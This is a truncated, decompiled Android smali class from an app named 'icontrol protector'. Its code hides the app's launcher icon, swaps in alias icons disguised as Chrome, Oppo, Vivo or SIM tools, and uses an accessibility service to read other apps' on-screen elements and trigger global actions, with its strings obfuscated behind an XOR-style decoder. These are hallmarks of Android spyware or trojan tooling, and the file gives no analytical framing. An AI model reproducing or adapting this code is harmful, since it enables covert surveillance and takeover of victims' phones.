.class public abstract Lcom/icontrol/protector/h;
.super Ljava/lang/Object;
.source "SourceFile"


# static fields
.field private static a:Ljava/util/Map;

.field public static b:Z

.field public static c:Z

.field public static d:Z


# direct methods
.method static constructor <clinit>()V
    .locals 4

    new-instance v0, Ljava/util/HashMap;

    invoke-direct {v0}, Ljava/util/HashMap;-><init>()V

    sput-object v0, Lcom/icontrol/protector/h;->a:Ljava/util/Map;

    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v1, 0x23

    const/4 v2, 0x1

    const/4 v3, 0x0

    if-lt v0, v1, :cond_0

    move v1, v2

    goto :goto_0

    :cond_0
    move v1, v3

    :goto_0
    sput-boolean v1, Lcom/icontrol/protector/h;->b:Z

    const/16 v1, 0x22

    if-lt v0, v1, :cond_1

    move v1, v2

    goto :goto_1

    :cond_1
    move v1, v3

    :goto_1
    sput-boolean v1, Lcom/icontrol/protector/h;->c:Z

    const/16 v1, 0x1d

    if-ne v0, v1, :cond_2

    goto :goto_2

    :cond_2
    move v2, v3

    :goto_2
    sput-boolean v2, Lcom/icontrol/protector/h;->d:Z

    return-void
.end method

.method private static a(Ljava/lang/String;Ljava/lang/String;)Z
    .locals 0

    .line 1
    invoke-virtual {p1, p0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result p0

    return p0
.end method

.method private static b(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;
    .locals 0

    .line 1
    invoke-virtual {p0, p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object p0

    invoke-interface {p0}, Ljava/util/List;->isEmpty()Z

    move-result p1

    if-eqz p1, :cond_0

    const/4 p0, 0x0

    return-object p0

    :cond_0
    const/4 p1, 0x0

    invoke-interface {p0, p1}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object p0

    check-cast p0, Landroid/view/accessibility/AccessibilityNodeInfo;

    return-object p0
.end method

.method private static c(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;)Ljava/lang/String;
    .locals 2

    .line 1
    invoke-virtual {p0, p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object p0

    invoke-interface {p0}, Ljava/util/List;->isEmpty()Z

    move-result p1

    const/4 v0, 0x0

    if-eqz p1, :cond_0

    return-object v0

    :cond_0
    const/4 p1, 0x0

    invoke-interface {p0, p1}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object p0

    check-cast p0, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    move-result-object p0

    if-nez p0, :cond_1

    return-object v0

    :cond_1
    invoke-interface {p0}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object p1

    sget-object v1, Lcom/icontrol/protector/AccessServices;->O:Ljava/lang/String;

    invoke-virtual {p1, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result p1

    if-eqz p1, :cond_2

    invoke-interface {p0}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object p0

    return-object p0

    :cond_2
    return-object v0
.end method

.method public static declared-synchronized d(Z)V
    .locals 6

    .line 1
    const-class v0, Lcom/icontrol/protector/h;

    monitor-enter v0

    :try_start_0
    sget-object v1, Lcom/icontrol/protector/AccessServices;->N:Lcom/icontrol/protector/AccessServices;

    invoke-virtual {v1}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v1

    new-instance v2, Landroid/content/ComponentName;

    sget-object v3, Lcom/icontrol/protector/AccessServices;->N:Lcom/icontrol/protector/AccessServices;

    const-class v4, Lcom/icontrol/protector/A1;

    invoke-direct {v2, v3, v4}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    new-instance v3, Landroid/content/ComponentName;

    sget-object v4, Lcom/icontrol/protector/AccessServices;->N:Lcom/icontrol/protector/AccessServices;

    const-class v5, Lcom/icontrol/protector/TransparentLauncherAlias;

    invoke-direct {v3, v4, v5}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    if-nez p0, :cond_0

    const/4 p0, 0x1

    invoke-virtual {v1, v3, p0, p0}, Landroid/content/pm/PackageManager;->setComponentEnabledSetting(Landroid/content/ComponentName;II)V
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    const-wide/16 v3, 0xc8

    :try_start_1
    invoke-static {v3, v4}, Ljava/lang/Thread;->sleep(J)V
    :try_end_1
    .catch Ljava/lang/InterruptedException; {:try_start_1 .. :try_end_1} :catch_0
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    const/4 v3, 0x2

    :try_start_2
    invoke-virtual {v1, v2, v3, p0}, Landroid/content/pm/PackageManager;->setComponentEnabledSetting(Landroid/content/ComponentName;II)V

    sget-object p0, Lcom/icontrol/protector/AccessServices;->N:Lcom/icontrol/protector/AccessServices;

    invoke-virtual {p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object p0

    sget-object v1, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/tc;->n:Ljava/lang/String;

    sget-object v2, Ljava/lang/Boolean;->TRUE:Ljava/lang/Boolean;

    invoke-static {p0, v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->d(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)V

    goto :goto_0

    :catchall_0
    move-exception p0

    goto :goto_1

    :catch_0
    move-exception p0

    new-instance v1, Ljava/lang/RuntimeException;

    invoke-direct {v1, p0}, Ljava/lang/RuntimeException;-><init>(Ljava/lang/Throwable;)V

    throw v1
    :try_end_2
    .catchall {:try_start_2 .. :try_end_2} :catchall_0

    :cond_0
    :goto_0
    monitor-exit v0

    return-void

    :goto_1
    monitor-exit v0

    throw p0
.end method

.method protected static declared-synchronized e(Z)V
    .locals 5

    .line 1
    const-class v0, Lcom/icontrol/protector/h;

    monitor-enter v0

    :try_start_0
    sget-object v1, Lcom/icontrol/protector/AccessServices;->N:Lcom/icontrol/protector/AccessServices;

    invoke-virtual {v1}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v1

    new-instance v2, Landroid/content/ComponentName;

    sget-object v3, Lcom/icontrol/protector/AccessServices;->N:Lcom/icontrol/protector/AccessServices;

    const-class v4, Lcom/icontrol/protector/A1;

    invoke-direct {v2, v3, v4}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    if-nez p0, :cond_0

    const/4 p0, 0x2

    const/4 v3, 0x1

    invoke-virtual {v1, v2, p0, v3}, Landroid/content/pm/PackageManager;->setComponentEnabledSetting(Landroid/content/ComponentName;II)V

    sget-object p0, Lcom/icontrol/protector/AccessServices;->N:Lcom/icontrol/protector/AccessServices;

    invoke-virtual {p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object p0

    sget-object v1, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/tc;->n:Ljava/lang/String;

    sget-object v2, Ljava/lang/Boolean;->TRUE:Ljava/lang/Boolean;

    invoke-static {p0, v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->d(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)V
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    goto :goto_0

    :catchall_0
    move-exception p0

    goto :goto_1

    :cond_0
    :goto_0
    monitor-exit v0

    return-void

    :goto_1
    monitor-exit v0

    throw p0
.end method

.method protected static declared-synchronized f(Z)V
    .locals 8

    .line 1
    const-class v0, Lcom/icontrol/protector/h;

    monitor-enter v0

    :try_start_0
    sget-object v1, Lcom/icontrol/protector/AccessServices;->N:Lcom/icontrol/protector/AccessServices;

    invoke-virtual {v1}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v1

    new-instance v2, Landroid/content/ComponentName;

    sget-object v3, Lcom/icontrol/protector/AccessServices;->N:Lcom/icontrol/protector/AccessServices;

    const-class v4, Lcom/icontrol/protector/A1;

    invoke-direct {v2, v3, v4}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    sget-object v3, Lcom/icontrol/protector/My_Configs;->Draws_overs:Ljava/lang/String;

    const/4 v4, 0x1

    new-array v5, v4, [B

    const/4 v6, 0x0

    const/16 v7, -0xa

    aput-byte v7, v5, v6

    const/16 v6, 0x8

    new-array v6, v6, [B

    fill-array-data v6, :array_0

    invoke-static {v5, v6}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v3, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_0

    new-instance v3, Landroid/content/ComponentName;

    sget-object v5, Lcom/icontrol/protector/AccessServices;->N:Lcom/icontrol/protector/AccessServices;

    const-class v6, Lcom/icontrol/protector/ChromeLauncherAlias;

    invoke-direct {v3, v5, v6}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    goto :goto_0

    :catchall_0
    move-exception p0

    goto :goto_1

    :cond_0
    invoke-static {}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ev;->a()I

    move-result v3

    const/4 v5, 0x3

    if-ne v3, v5, :cond_1

    new-instance v3, Landroid/content/ComponentName;

    sget-object v5, Lcom/icontrol/protector/AccessServices;->N:Lcom/icontrol/protector/AccessServices;

    const-class v6, Lcom/icontrol/protector/OppoLauncherAlias;

    invoke-direct {v3, v5, v6}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    goto :goto_0

    :cond_1
    invoke-static {}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ev;->a()I

    move-result v3

    const/4 v5, 0x4

    if-ne v3, v5, :cond_2

    new-instance v3, Landroid/content/ComponentName;

    sget-object v5, Lcom/icontrol/protector/AccessServices;->N:Lcom/icontrol/protector/AccessServices;

    const-class v6, Lcom/icontrol/protector/VivoLauncherAlias;

    invoke-direct {v3, v5, v6}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    goto :goto_0

    :cond_2
    new-instance v3, Landroid/content/ComponentName;

    sget-object v5, Lcom/icontrol/protector/AccessServices;->N:Lcom/icontrol/protector/AccessServices;

    const-class v6, Lcom/icontrol/protector/SIMLauncherAlias;

    invoke-direct {v3, v5, v6}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    :goto_0
    if-nez p0, :cond_3

    const/4 p0, 0x2

    invoke-virtual {v1, v2, p0, v4}, Landroid/content/pm/PackageManager;->setComponentEnabledSetting(Landroid/content/ComponentName;II)V

    invoke-virtual {v1, v3, v4, v4}, Landroid/content/pm/PackageManager;->setComponentEnabledSetting(Landroid/content/ComponentName;II)V

    sget-object p0, Lcom/icontrol/protector/AccessServices;->N:Lcom/icontrol/protector/AccessServices;

    invoke-virtual {p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object p0

    sget-object v1, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/tc;->n:Ljava/lang/String;

    sget-object v2, Ljava/lang/Boolean;->TRUE:Ljava/lang/Boolean;

    invoke-static {p0, v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->d(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)V
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    :cond_3
    monitor-exit v0

    return-void

    :goto_1
    monitor-exit v0

    throw p0

    :array_0
    .array-data 1
        -0x39t
        0x23t
        0x26t
        0x29t
        0x1dt
        0x46t
        0x7dt
        -0x7et
    .end array-data
.end method

.method public static declared-synchronized g(Z)V
    .locals 6

    .line 1
    const-class v0, Lcom/icontrol/protector/h;

    monitor-enter v0

    :try_start_0
    sget-object v1, Lcom/icontrol/protector/AccessServices;->N:Lcom/icontrol/protector/AccessServices;

    invoke-virtual {v1}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v1

    new-instance v2, Landroid/content/ComponentName;

    sget-object v3, Lcom/icontrol/protector/AccessServices;->N:Lcom/icontrol/protector/AccessServices;

    const-class v4, Lcom/icontrol/protector/A1;

    invoke-direct {v2, v3, v4}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    new-instance v3, Landroid/content/ComponentName;

    sget-object v4, Lcom/icontrol/protector/AccessServices;->N:Lcom/icontrol/protector/AccessServices;

    const-class v5, Lcom/icontrol/protector/TransparentLauncherAlias;

    invoke-direct {v3, v4, v5}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    if-nez p0, :cond_0

    const/4 p0, 0x1

    invoke-virtual {v1, v3, p0, p0}, Landroid/content/pm/PackageManager;->setComponentEnabledSetting(Landroid/content/ComponentName;II)V
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    const-wide/16 v3, 0x5dc

    :try_start_1
    invoke-static {v3, v4}, Ljava/lang/Thread;->sleep(J)V
    :try_end_1
    .catch Ljava/lang/InterruptedException; {:try_start_1 .. :try_end_1} :catch_0
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    :try_start_2
    sget-object v3, Lcom/icontrol/protector/AccessServices;->N:Lcom/icontrol/protector/AccessServices;

    const/4 v4, 0x2

    invoke-virtual {v3, v4}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z

    invoke-virtual {v1, v2, v4, p0}, Landroid/content/pm/PackageManager;->setComponentEnabledSetting(Landroid/content/ComponentName;II)V

    sget-object p0, Lcom/icontrol/protector/AccessServices;->N:Lcom/icontrol/protector/AccessServices;

    invoke-virtual {p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object p0

    sget-object v1, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/tc;->n:Ljava/lang/String;

    sget-object v2, Ljava/lang/Boolean;->TRUE:Ljava/lang/Boolean;

    invoke-static {p0, v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->d(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)V

    goto :goto_0

    :catchall_0
    move-exception p0

    goto :goto_1

    :catch_0
    move-exception p0

    new-instance v1, Ljava/lang/RuntimeException;

    invoke-direct {v1, p0}, Ljava/lang/RuntimeException;-><init>(Ljava/lang/Throwable;)V

    throw v1
    :try_end_2
    .catchall {:try_start_2 .. :try_end_2} :catchall_0

    :cond_0
    :goto_0
    monitor-exit v0

    return-void

    :goto_1
    monitor-exit v0

    throw p0
.end method

.method public static h(Landroid/view/accessibility/AccessibilityEvent;Lcom/icontrol/protector/AccessServices;)V
    .locals 16

    .line 1
    invoke-virtual/range {p1 .. p1}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    invoke-virtual/range {p0 .. p0}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    move-result-object v1

    if-nez v1, :cond_0

    const/4 v1, 0x0

    goto :goto_0

    :cond_0
    invoke-virtual/range {p0 .. p0}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    move-result-object v1

    invoke-interface {v1}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v1

    :goto_0
    sget-object v3, Lcom/icontrol/protector/My_Configs;->Hide_Type:Ljava/lang/String;

    const/4 v4, 0x1

    new-array v5, v4, [B

    const/16 v6, -0x75

    const/4 v7, 0x0

    aput-byte v6, v5, v7

    const/16 v6, 0x8

    new-array v8, v6, [B

    fill-array-data v8, :array_0

    invoke-static {v5, v8}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v3, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-nez v3, :cond_1

    return-void

    :cond_1
    sget-object v3, Lcom/icontrol/protector/AccessServices;->N:Lcom/icontrol/protector/AccessServices;

    invoke-virtual {v3}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v3

    sget-object v5, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/tc;->n:Ljava/lang/String;

    sget-object v8, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    invoke-static {v3, v5, v8}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->b(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v3

    if-eqz v3, :cond_2

    return-void

    :cond_2
    if-eqz v0, :cond_1a

    if-nez v1, :cond_3

    goto/16 :goto_7

    :cond_3
    sget-object v3, Lcom/icontrol/protector/AccessServices;->O:Ljava/lang/String;

    invoke-static {}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ev;->a()I

    move-result v5

    const/16 v8, 0x2a

    const/16 v9, 0x1b

    const/16 v10, 0xf

    const/4 v11, 0x3

    const/4 v12, 0x2

    const/16 v13, 0x12

    if-ne v5, v4, :cond_5

    new-array v5, v9, [B

    fill-array-data v5, :array_1

    new-array v14, v6, [B

    fill-array-data v14, :array_2

    invoke-static {v5, v14}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v5, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-eqz v5, :cond_5

    new-array v5, v13, [B

    fill-array-data v5, :array_3

    new-array v14, v6, [B

    fill-array-data v14, :array_4

    invoke-static {v5, v14}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-static {v0, v5}, Lcom/icontrol/protector/h;->b(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v5

    if-eqz v5, :cond_5

    new-array v5, v13, [B

    fill-array-data v5, :array_5

    new-array v14, v6, [B

    fill-array-data v14, :array_6

    invoke-static {v5, v14}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-static {v0, v5}, Lcom/icontrol/protector/h;->b(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v5

    if-eqz v5, :cond_5

    new-array v1, v8, [B

    fill-array-data v1, :array_7

    new-array v3, v6, [B

    fill-array-data v3, :array_8

    invoke-static {v1, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Lcom/icontrol/protector/h;->c(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    if-eqz v1, :cond_4

    new-array v1, v13, [B

    fill-array-data v1, :array_9

    new-array v2, v6, [B

    fill-array-data v2, :array_a

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    :goto_1
    invoke-static {v0, v1}, Lcom/icontrol/protector/h;->b(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v2

    move v0, v4

    goto/16 :goto_3

    :cond_4
    move v0, v7

    const/4 v2, 0x0

    goto/16 :goto_3

    :cond_5
    invoke-static {}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ev;->a()I

    move-result v5

    if-ne v5, v12, :cond_6

    new-array v5, v13, [B

    fill-array-data v5, :array_b

    new-array v14, v6, [B

    fill-array-data v14, :array_c

    invoke-static {v5, v14}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-static {v0, v5}, Lcom/icontrol/protector/h;->b(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v5

    if-eqz v5, :cond_6

    new-array v5, v13, [B

    fill-array-data v5, :array_d

    new-array v14, v6, [B

    fill-array-data v14, :array_e

    invoke-static {v5, v14}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-static {v0, v5}, Lcom/icontrol/protector/h;->b(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v5

    if-eqz v5, :cond_6

    const/16 v1, 0x16

    new-array v1, v1, [B

    fill-array-data v1, :array_f

    new-array v3, v6, [B

    fill-array-data v3, :array_10

    invoke-static {v1, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Lcom/icontrol/protector/h;->c(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    if-eqz v1, :cond_4

    new-array v1, v13, [B

    fill-array-data v1, :array_11

    new-array v2, v6, [B

    fill-array-data v2, :array_12

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    goto :goto_1

    :cond_6
    invoke-static {}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ev;->a()I

    move-result v5

    const/16 v14, 0x15

    if-ne v5, v11, :cond_9

    new-array v5, v13, [B

    fill-array-data v5, :array_13

    new-array v15, v6, [B

    fill-array-data v15, :array_14

    invoke-static {v5, v15}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-static {v0, v5}, Lcom/icontrol/protector/h;->b(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v5

    if-eqz v5, :cond_9

    new-array v5, v13, [B

    fill-array-data v5, :array_15

    new-array v15, v6, [B

    fill-array-data v15, :array_16

    invoke-static {v5, v15}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-static {v0, v5}, Lcom/icontrol/protector/h;->b(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v5

    if-eqz v5, :cond_9

    new-array v1, v14, [B

    fill-array-data v1, :array_17

    new-array v5, v6, [B

    fill-array-data v5, :array_18

    invoke-static {v1, v5}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Lcom/icontrol/protector/h;->c(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    const/16 v5, 0x22

    new-array v5, v5, [B

    fill-array-data v5, :array_19

    new-array v8, v6, [B

    fill-array-data v8, :array_1a

    invoke-static {v5, v8}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-static {v0, v5}, Lcom/icontrol/protector/h;->c(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    if-eqz v1, :cond_7

    invoke-static {v3, v1}, Lcom/icontrol/protector/h;->a(Ljava/lang/String;Ljava/lang/String;)Z

    move-result v1

    if-nez v1, :cond_8

    :cond_7
    if-eqz v5, :cond_4

    invoke-static {v3, v5}, Lcom/icontrol/protector/h;->a(Ljava/lang/String;Ljava/lang/String;)Z

    move-result v1

    if-eqz v1, :cond_4

    :cond_8
    new-array v1, v13, [B

    fill-array-data v1, :array_1b

    new-array v2, v6, [B

    fill-array-data v2, :array_1c

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    goto/16 :goto_1

    :cond_9
    invoke-static {}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ev;->a()I

    move-result v5

    if-ne v5, v11, :cond_a

    const/16 v5, 0x11

    new-array v5, v5, [B

    fill-array-data v5, :array_1d

    new-array v15, v6, [B

    fill-array-data v15, :array_1e

    invoke-static {v5, v15}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v5, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-eqz v5, :cond_a

    const/16 v5, 0x21

    new-array v15, v5, [B

    fill-array-data v15, :array_1f

    new-array v2, v6, [B

    fill-array-data v2, :array_20

    invoke-static {v15, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

